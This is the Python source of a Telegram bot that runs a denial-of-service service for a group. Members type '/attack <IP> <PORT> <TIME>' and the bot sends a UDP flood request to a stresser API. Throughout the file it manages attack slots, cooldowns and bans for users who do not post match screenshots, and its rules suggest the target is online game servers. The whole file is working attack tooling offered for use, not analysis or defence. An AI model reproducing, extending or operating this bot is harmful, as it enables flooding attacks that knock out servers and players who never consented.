import telebot
from telebot import types
import os
import time
import requests
import threading
from datetime import datetime
from dotenv import load_dotenv
from pymongo import MongoClient

# Load environment variables
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "1351184742"))
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "RINOMODS")
RETROSTRESS_API_URL = os.getenv("RETROSTRESS_API_URL")
RETROSTRESS_API_KEY = os.getenv("RETROSTRESS_API_KEY")

if not BOT_TOKEN or not MONGODB_URI:
    print("❌ ERROR: BOT_TOKEN or MONGODB_URI is missing!")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# MongoDB Connection
try:
    client = MongoClient(MONGODB_URI)
    db = client[DATABASE_NAME]
    users_col = db['group_users']
    settings_col = db['group_settings']
    active_attacks_col = db['active_attacks']
    forward_mappings_col = db['forward_mappings']
    
    # Ensure indexes
    users_col.create_index("user_id", unique=True)
    forward_mappings_col.create_index("owner_msg_id", unique=True)
    print("✅ MongoDB connected!")
except Exception as e:
    print(f"❌ MongoDB connection failed: {e}")
    exit(1)

def is_member_of_channel(user_id):
    channel_id = get_setting("channel_id", "Not Set")
    if channel_id == "Not Set":
        return True # Skip check if not set
    try:
        # Check if the channel_id is numeric (e.g. -1001234567890) and convert it to int
        if str(channel_id).strip().replace('-', '').replace('+', '').isdigit():
            channel_id = int(str(channel_id).strip())
        elif not str(channel_id).startswith('@'):
            channel_id = f"@{channel_id}"
            
        member = bot.get_chat_member(chat_id=channel_id, user_id=user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception as e:
        print(f"Private channel check failed for {user_id} using {channel_id}: {e}")
        return True

# --- Default Settings ---
def get_setting(key, default_value):
    doc = settings_col.find_one({"_id": key})
    if doc:
        return doc.get("value", default_value)
    return default_value

def set_setting(key, value):
    settings_col.update_one({"_id": key}, {"$set": {"value": value}}, upsert=True)

# Helper functions
def is_owner(user_id):
    return user_id == OWNER_ID

# --- OWNER DM HANDLERS ---

# --- DM FORWARDING & REPLY SYSTEM ---

@bot.message_handler(func=lambda m: m.chat.type == 'private' and not is_owner(m.from_user.id), content_types=['text', 'photo', 'video', 'document', 'audio', 'voice', 'sticker'])
def forward_to_owner(message):
    try:
        # Forward message to Owner
        forwarded = bot.forward_message(chat_id=OWNER_ID, from_chat_id=message.chat.id, message_id=message.message_id)
        
        # Save mapping to MongoDB
        forward_mappings_col.insert_one({
            "owner_msg_id": forwarded.message_id,
            "user_id": message.from_user.id,
            "created_at": int(time.time())
        })
        
        # Notify user that their message has been sent to the owner
        bot.reply_to(message, "📬 **Message forwarded to the Owner successfully!** Please wait for their reply.")
    except Exception as e:
        print(f"Failed to forward message to owner: {e}")
        bot.reply_to(message, "❌ Failed to forward your message. Please try again later.")

@bot.message_handler(func=lambda m: m.chat.type == 'private' and is_owner(m.from_user.id) and m.reply_to_message is not None, content_types=['text', 'photo', 'video', 'document', 'audio', 'voice', 'sticker'])
def reply_to_forwarded_message(message):
    try:
        # Get target user from reply mapping
        reply_to_id = message.reply_to_message.message_id
        mapping = forward_mappings_col.find_one({"owner_msg_id": reply_to_id})
        
        if mapping:
            target_user_id = mapping["user_id"]
            # Copy owner reply back to the user
            bot.copy_message(chat_id=target_user_id, from_chat_id=message.chat.id, message_id=message.message_id)
            bot.reply_to(message, f"✅ **Reply sent to user** `{target_user_id}` successfully!")
        else:
            # Let fallback handle other owner commands
            pass
    except Exception as e:
        bot.reply_to(message, f"❌ **Failed to send reply:** {str(e)}")

@bot.message_handler(commands=['start', 'help'], func=lambda m: m.chat.type == 'private')
def dm_start(message):
    if not is_owner(message.from_user.id):
        return  # Ignore non-owners for start/help in DM
        
    text = (
        "👑 **Owner Control Panel**\n\n"
        "**Group Setup:**\n"
        "1. Add bot to your group and send `/setgroup`\n"
        "2. Add bot to your channel and send `/setchannel` in DM like: `/setchannel -100xxx` or `@RINOMODSOFFICIAL`\n"
        "3. Set channel invite link: `/setchannellink <invite_link>`\n"
        "4. Set dedicated feedback channel: `/setfeedbackchannel <id_or_username>`\n\n"
        "**Settings Commands:**\n"
        "`/settings` - View current settings\n"
        "`/setconcurrent <num>` - Set max active attacks (default 3)\n"
        "`/setduration <sec>` - Set max attack time (default 60)\n"
        "`/setcooldown <sec>` - Set user cooldown (default 100)\n"
        "`/setbantime <min>` - Set ban time for missing feedback (default 10)\n"
        "`/unban <user_id>` - Unban a user\n"
        "`/resetfeedback <user_id>` - Bypass feedback for a user\n"
    )
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['settings'], func=lambda m: m.chat.type == 'private' and is_owner(m.from_user.id))
def show_settings(message):
    group_id = get_setting("group_id", "Not Set")
    channel_id = get_setting("channel_id", "Not Set")
    channel_link = get_setting("channel_link", "Not Set")
    feedback_channel_id = get_setting("feedback_channel_id", "Not Set")
    concurrent = get_setting("max_concurrent", 3)
    duration = get_setting("max_duration", 60)
    cooldown = get_setting("cooldown", 100)
    bantime = get_setting("bantime", 10)
    
    text = (
        "⚙️ **Current Settings:**\n\n"
        f"👥 Group ID: `{group_id}`\n"
        f"📢 Join Channel ID: `{channel_id}`\n"
        f"🔗 Join Channel Link: `{channel_link}`\n"
        f"📸 Feedback Channel ID: `{feedback_channel_id}`\n"
        f"⚡ Max Concurrent Attacks: `{concurrent}`\n"
        f"⏱️ Max Attack Duration: `{duration}s`\n"
        f"⏳ User Cooldown: `{cooldown}s`\n"
        f"🚫 Feedback Ban Time: `{bantime} mins`\n"
    )
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['setconcurrent', 'setduration', 'setcooldown', 'setbantime', 'setchannel', 'setchannellink', 'setfeedbackchannel'], func=lambda m: m.chat.type == 'private' and is_owner(m.from_user.id))
def update_settings(message):
    parts = message.text.split(maxsplit=1)
    cmd = parts[0].lower()
    try:
        val = parts[1]
        
        if cmd == "/setchannel":
            set_setting("channel_id", val) # Channel ID is string/int
            bot.reply_to(message, f"✅ Join Channel set to: `{val}`", parse_mode="Markdown")
        elif cmd == "/setchannellink":
            set_setting("channel_link", val)
            bot.reply_to(message, f"✅ Channel invite link set to: `{val}`", parse_mode="Markdown")
        elif cmd == "/setfeedbackchannel":
            set_setting("feedback_channel_id", val)
            bot.reply_to(message, f"✅ Feedback Channel set to: `{val}`", parse_mode="Markdown")
        else:
            val = int(val)
            if cmd == "/setconcurrent":
                set_setting("max_concurrent", val)
                bot.reply_to(message, f"✅ Max concurrent attacks set to: `{val}`", parse_mode="Markdown")
            elif cmd == "/setduration":
                set_setting("max_duration", val)
                bot.reply_to(message, f"✅ Max attack duration set to: `{val}s`", parse_mode="Markdown")
            elif cmd == "/setcooldown":
                set_setting("cooldown", val)
                bot.reply_to(message, f"✅ User cooldown set to: `{val}s`", parse_mode="Markdown")
            elif cmd == "/setbantime":
                set_setting("bantime", val)
                bot.reply_to(message, f"✅ Missing feedback ban time set to: `{val} mins`", parse_mode="Markdown")
    except:
        bot.reply_to(message, f"❌ Invalid format. Use: {cmd} <value>")

@bot.message_handler(commands=['unban'], func=lambda m: m.chat.type == 'private' and is_owner(m.from_user.id))
def unban_user(message):
    try:
        uid = int(message.text.split()[1])
        users_col.update_one({"user_id": uid}, {"$set": {"banned_until": 0}})
        bot.reply_to(message, f"✅ User {uid} unbanned.")
    except:
        bot.reply_to(message, "❌ Format: /unban <user_id>")

@bot.message_handler(commands=['resetfeedback'], func=lambda m: m.chat.type == 'private' and is_owner(m.from_user.id))
def reset_feedback(message):
    try:
        uid = int(message.text.split()[1])
        users_col.update_one({"user_id": uid}, {"$set": {"feedback_required": False}})
        bot.reply_to(message, f"✅ Feedback requirement removed for user {uid}.")
    except:
        bot.reply_to(message, "❌ Format: /resetfeedback <user_id>")

# --- GROUP HANDLERS ---

@bot.message_handler(commands=['setgroup'], func=lambda m: m.chat.type in ['group', 'supergroup'])
def set_group(message):
    if not is_owner(message.from_user.id):
        return
    set_setting("group_id", message.chat.id)
    bot.reply_to(message, f"✅ Group authorized for attacks! ID: {message.chat.id}")

@bot.message_handler(commands=['attack'], func=lambda m: m.chat.type in ['group', 'supergroup'])
def handle_attack(message):
    allowed_group = get_setting("group_id", None)
    if not allowed_group or message.chat.id != allowed_group:
        if is_owner(message.from_user.id):
            bot.reply_to(message, "⚠️ This group is not authorized. Use /setgroup first.")
        return # Ignore attacks in unauthorized groups
        
    user_id = message.from_user.id
    
    # Check channel join status if it is a group attack
    if not is_member_of_channel(user_id):
        channel_link = get_setting("channel_link", "")
        if not channel_link:
            channel_id = get_setting("channel_id", "")
            if channel_id:
                channel_link = f"https://t.me/{str(channel_id).replace('@', '').replace('-100', '')}"
            else:
                channel_link = "https://t.me/RINOMODSOFFICIAL"
        
        markup = types.InlineKeyboardMarkup()
        btn_join = types.InlineKeyboardButton("📢 Join Channel 📢", url=channel_link)
        markup.add(btn_join)
        
        warning_text = (
            f"⚠️ **Access Denied!** ⚠️\n\n"
            f"Hey {message.from_user.first_name}, you must join our channel to use the attack command in this group!\n\n"
            f"👉 Click the button below to join, then try your attack again!"
        )
        
        sent_warning = bot.reply_to(message, warning_text, reply_markup=markup, parse_mode="Markdown")
        
        # Auto-delete messages after 10 seconds to keep group clean
        def auto_delete():
            time.sleep(10)
            try:
                bot.delete_message(chat_id=message.chat.id, message_id=sent_warning.message_id)
            except:
                pass
            try:
                bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
            except:
                pass
        
        threading.Thread(target=auto_delete, daemon=True).start()
        return

    now = int(time.time())
    
    # Get user data
    user = users_col.find_one({"user_id": user_id}) or {"user_id": user_id, "banned_until": 0, "cooldown_until": 0, "feedback_required": False}
    
    # 1. Check if banned
    if user.get("banned_until", 0) > now:
        remaining = int((user["banned_until"] - now) / 60)
        bot.reply_to(message, f"🚫 You are banned from using the bot for {remaining} more minutes due to missing feedback!")
        return
        
    # 2. Check if feedback is required
    if user.get("feedback_required", False):
        # User tried to attack again WITHOUT sending feedback!
        ban_mins = get_setting("bantime", 10)
        banned_until = now + (ban_mins * 60)
        users_col.update_one(
            {"user_id": user_id}, 
            {"$set": {"banned_until": banned_until, "feedback_required": False}}, 
            upsert=True
        )
        bot.reply_to(message, f"😡 **BANNED!**\n\nYou tried to launch another attack without providing a screenshot/feedback for your previous one.\nYou are banned from using the bot for {ban_mins} minutes.")
        return
        
    # 3. Check cooldown
    if user.get("cooldown_until", 0) > now:
        remaining = user["cooldown_until"] - now
        bot.reply_to(message, f"⏳ Cooldown active! Please wait {remaining} seconds.")
        return
        
    # Parse attack command
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "📝 **Format:** `/attack <IP> <PORT> <TIME>`", parse_mode="Markdown")
        return
        
    target_ip = args[1]
    try:
        target_port = int(args[2])
        duration = int(args[3])
    except:
        bot.reply_to(message, "❌ Port and Time must be numbers.")
        return
        
    # Validate duration
    max_duration = get_setting("max_duration", 60)
    if duration > max_duration:
        bot.reply_to(message, f"❌ Maximum attack time is {max_duration} seconds.")
        return
        
    # 4. Check concurrent attacks
    max_concurrent = get_setting("max_concurrent", 3)
    active_count = active_attacks_col.count_documents({"expires_at": {"$gt": now}})
    if active_count >= max_concurrent:
        bot.reply_to(message, f"⚠️ Server is busy! {active_count}/{max_concurrent} attacks are running. Please wait.")
        return
        
    # --- LAUNCH ATTACK ---
    url = RETROSTRESS_API_URL
    if "[target]" in url:
        url = url.replace("[target]", target_ip).replace("[port]", str(target_port)).replace("[time]", str(duration)).replace("[method]", "UDP-BYPASS")
        if "key=0" in url and RETROSTRESS_API_KEY:
            url = url.replace("key=0", f"key={RETROSTRESS_API_KEY}")
    else:
        url = f"{RETROSTRESS_API_URL}?key={RETROSTRESS_API_KEY}&host={target_ip}&port={target_port}&time={duration}&method=UDP-BYPASS"
        
    try:
        bot.reply_to(message, "🚀 Sending attack...")
        res = requests.get(url, timeout=10)
        
        if res.status_code in [200, 201]:
            # Record attack
            active_attacks_col.insert_one({
                "user_id": user_id,
                "ip": target_ip,
                "port": target_port,
                "expires_at": now + duration
            })
            
            # Update user state
            cooldown_sec = get_setting("cooldown", 100)
            users_col.update_one(
                {"user_id": user_id},
                {"$set": {
                    "cooldown_until": now + cooldown_sec,
                    "feedback_required": True
                }},
                upsert=True
            )
            
            bot.reply_to(message, 
                f"✅ **ATTACK SENT SUCCESSFULLY!**\n\n"
                f"🎯 **Target:** `{target_ip}:{target_port}`\n"
                f"⏱️ **Time:** `{duration}s`\n"
                f"👤 **User:** @{message.from_user.username or message.from_user.first_name}\n\n"
                f"⚠️ **IMPORTANT:** You MUST send a screenshot of the match as feedback in this group before your next attack, or you will be banned for {get_setting('bantime', 10)} minutes!",
                parse_mode="Markdown"
            )
            
            # Personal Group Attack Alert to Owner
            if user_id != OWNER_ID:
                try:
                    group_title = message.chat.title or "Group"
                    group_link = f" (ID: `{message.chat.id}`)"
                    if message.chat.username:
                        group_link = f" (Username: @{message.chat.username})"
                        
                    bot.send_message(OWNER_ID,
                        f"📢 **Group Attack Alert!**\n\n"
                        f"👥 **Group:** `{group_title}`{group_link}\n"
                        f"👤 **User:** `{user_id}` (@{message.from_user.username or 'N/A'})\n"
                        f"🎯 **Target:** `{target_ip}:{target_port}`\n"
                        f"⏱️ **Duration:** `{duration}s`\n"
                        f"📝 **API Response:** `{res.text[:4000]}`",
                        parse_mode="Markdown"
                    )
                except Exception as e:
                    print(f"Failed to send owner alert: {e}")
        else:
            bot.reply_to(message, f"❌ API Error: {res.status_code}\nServer might be down.")
            if user_id != OWNER_ID:
                try:
                    bot.send_message(OWNER_ID,
                        f"🚨 **API Error Alert (Bot)**\n\n"
                        f"👤 **User:** `{user_id}` (@{message.from_user.username or 'N/A'})\n"
                        f"🎯 **Target:** `{target_ip}:{target_port}`\n"
                        f"🚫 **Status:** {res.status_code}\n"
                        f"📝 **Response:** `{res.text[:4000]}`",
                        parse_mode="Markdown"
                    )
                except:
                    pass
            
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to connect to API: {str(e)}")
        if user_id != OWNER_ID:
            try:
                bot.send_message(OWNER_ID,
                    f"🚨 **API Connection Failed (Bot)**\n\n"
                    f"👤 **User:** `{user_id}` (@{message.from_user.username or 'N/A'})\n"
                    f"🎯 **Target:** `{target_ip}:{target_port}`\n"
                    f"📝 **Error:** `{str(e)}`",
                    parse_mode="Markdown"
                )
            except:
                pass

# --- RULES COMMAND ---
@bot.message_handler(commands=['rules'], func=lambda m: m.chat.type in ['group', 'supergroup'])
def send_rules(message):
    rules_text = (
        "⚠️ **IF YOUR ID IS RICH THEN DO THESE STEPS:**\n\n"
        "1- PLAY 1 GAME WITH SERV#R H4CK\n"
        "2- DON'T KILL OFFLINE PLAYER JUST TAKE CHIKEN FROM BOT LOBBY AND KILLS SOME ONLINE PLAYER AROUND 4-5\n\n"
        "Enjoy 😊"
    )
    bot.reply_to(message, rules_text, parse_mode="Markdown")

def get_server_ip():
    try:
        res = requests.get("https://api.ipify.org?format=json", timeout=5)
        if res.status_code == 200:
            return res.json().get("ip", "Unknown IP")
    except:
        pass
    return "Unknown IP"

# --- STATUS COMMAND ---
@bot.message_handler(commands=['status'])
def check_status(message):
    try:
        now = int(time.time())
        max_concurrent = get_setting("max_concurrent", 3)
        
        # Get active attacks
        active_attacks = list(active_attacks_col.find({"expires_at": {"$gt": now}}))
        active_count = len(active_attacks)
        
        # Build slot progress bar
        squares = "🔴" * active_count
        circles = "🟢" * max(0, max_concurrent - active_count)
        slot_bar = f"[{squares}{circles}]"
        
        server_ip = get_server_ip()
        
        status_text = (
            f"⚡ **GHOST FREE REAL-TIME STATUS** ⚡\n\n"
            f"🖥️ **Server Status:** `🟢 ONLINE`\n"
            f"📍 **Server IP:** `{server_ip}`\n"
            f"🎰 **Concurrent Slots:** `{active_count}/{max_concurrent}` {slot_bar}\n\n"
        )
        
        if active_count > 0:
            status_text += "🚀 **Running Targets:**\n"
            for attack in active_attacks:
                target = attack.get("ip", "Unknown")
                port = attack.get("port", "Unknown")
                expiry = attack.get("expires_at", 0)
                remaining = max(0, expiry - now)
                
                # Obfuscate target IP for regular users, keep for owner
                if not is_owner(message.from_user.id):
                    parts = target.split(".")
                    if len(parts) == 4:
                        target = f"{parts[0]}.***.***.{parts[3]}"
                
                status_text += f"🔹 `{target}:{port}` | ⏱️ `{remaining}s left`\n"
        else:
            status_text += "🍀 **All slots are currently free! Ready to flood.**"
            
        bot.reply_to(message, status_text, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to fetch real-time status: {str(e)}")

# --- WELCOME LISTENER ---
@bot.message_handler(content_types=['new_chat_members'], func=lambda m: m.chat.type in ['group', 'supergroup'])
def handle_new_member(message):
    allowed_group = get_setting("group_id", None)
    if not allowed_group or message.chat.id != allowed_group:
        return
        
    max_duration = get_setting("max_duration", 60)
    cooldown = get_setting("cooldown", 100)
    bantime = get_setting("bantime", 10)
    
    for new_member in message.new_chat_members:
        if new_member.id != bot.get_me().id:
            welcome_msg = (
                f"Welcome [{new_member.first_name}](tg://user?id={new_member.id}) to the Group!\n\n"
                f"🚀 **Bot Features & Info:**\n"
                f"⏱️ Max Attack Time: `{max_duration}s`\n"
                f"⏳ Cooldown: `{cooldown}s`\n"
                f"📸 **Feedback Rule:** After your first attack, you MUST send a match screenshot here before you can attack again. Failure to do so will ban you for {bantime} minutes!\n\n"
                f"⚠️ Please type `/rules` to read the safe playing guidelines before attacking!"
            )
            try:
                bot.reply_to(message, welcome_msg, parse_mode="Markdown")
            except:
                pass

# --- FEEDBACK LISTENER ---
@bot.message_handler(content_types=['photo'], func=lambda m: m.chat.type in ['group', 'supergroup'])
def handle_feedback(message):
    allowed_group = get_setting("group_id", None)
    if not allowed_group or message.chat.id != allowed_group:
        return
        
    user_id = message.from_user.id
    user = users_col.find_one({"user_id": user_id})
    
    if user and user.get("feedback_required", False):
        # User has provided feedback!
        users_col.update_one({"user_id": user_id}, {"$set": {"feedback_required": False}})
        
        bot.reply_to(message, "✅ Feedback accepted! You can now use `/attack` again when your cooldown is over.")
        
        # Forward to feedback channel (dedicated feedback channel has priority, fallback to join channel)
        feedback_target = get_setting("feedback_channel_id", None)
        if not feedback_target or feedback_target == "Not Set":
            feedback_target = get_setting("channel_id", None)
            
        if feedback_target and feedback_target != "Not Set":
            try:
                # Convert numeric string to integer for telegram api compatibility
                if str(feedback_target).strip().replace('-', '').replace('+', '').isdigit():
                    feedback_target = int(str(feedback_target).strip())
                elif not str(feedback_target).startswith('@'):
                    feedback_target = f"@{feedback_target}"
                    
                caption = f"📢 **New Attack Feedback!**\n\n👤 **User:** @{message.from_user.username or message.from_user.first_name} (ID: `{user_id}`)"
                if message.caption:
                    caption += f"\n\n📝 **Caption:** {message.caption}"
                bot.send_photo(feedback_target, message.photo[-1].file_id, caption=caption, parse_mode="Markdown")
            except Exception as e:
                print(f"Failed to forward feedback to channel {feedback_target}: {e}")

# Cleanup old active attacks periodically
def cleanup_task():
    while True:
        try:
            now = int(time.time())
            active_attacks_col.delete_many({"expires_at": {"$lt": now}})
        except:
            pass
        time.sleep(30)

threading.Thread(target=cleanup_task, daemon=True).start()

print("="*50)
print("GROUP ATTACK BOT STARTED!")
print("="*50)
bot.infinity_polling()